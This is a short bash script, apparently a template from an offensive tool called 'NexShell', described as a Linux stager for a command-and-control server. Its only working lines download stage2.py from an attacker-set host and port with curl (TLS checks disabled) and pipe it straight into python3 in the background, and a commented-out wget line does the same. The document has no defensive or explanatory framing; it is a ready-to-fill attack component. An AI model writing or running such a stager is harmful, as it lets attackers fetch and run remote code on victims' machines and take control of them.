#!/bin/bash
# NexShell Stager — Linux
# Fetches and executes the main payload from C2 server
LHOST={LHOST}
LPORT={LPORT}
# Download and execute in memory
curl -sk http://$LHOST:$LPORT/stage2.py | python3 &
# Alternative: wget
# wget -qO- http://$LHOST:$LPORT/stage2.py | python3 &
